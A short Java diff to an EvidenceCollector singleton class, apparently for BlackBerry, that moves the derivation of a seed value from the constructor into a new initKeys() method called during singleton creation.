@@ -99,6 +99,7 @@ public final class EvidenceCollector implements Singleton {
                     GUID);
             if (instance == null) {
                 final EvidenceCollector singleton = new EvidenceCollector();
+                singleton.initKeys();
                 singleton.initProgressive();
                 RuntimeStore.getRuntimeStore().put(GUID, singleton);
                 instance = singleton;
@@ -106,6 +107,11 @@ public final class EvidenceCollector implements Singleton {
         }
 
         return instance;
+    }
+
+    public void initKeys() {
+        byte[] proto = keys.getProtoKey();
+        seed = proto[0];
     }
 
     private void initProgressive() {
@@ -123,13 +129,13 @@ public final class EvidenceCollector implements Singleton {
 
     /**
      * Instantiates a new log collector.
+     * @throws Exception 
      */
     private EvidenceCollector() {
         super();        
         logVector = new Vector();
         
         keys = Encryption.getKeys();
-        seed = keys.getProtoKey()[0];
     }
 
     private void clear() {
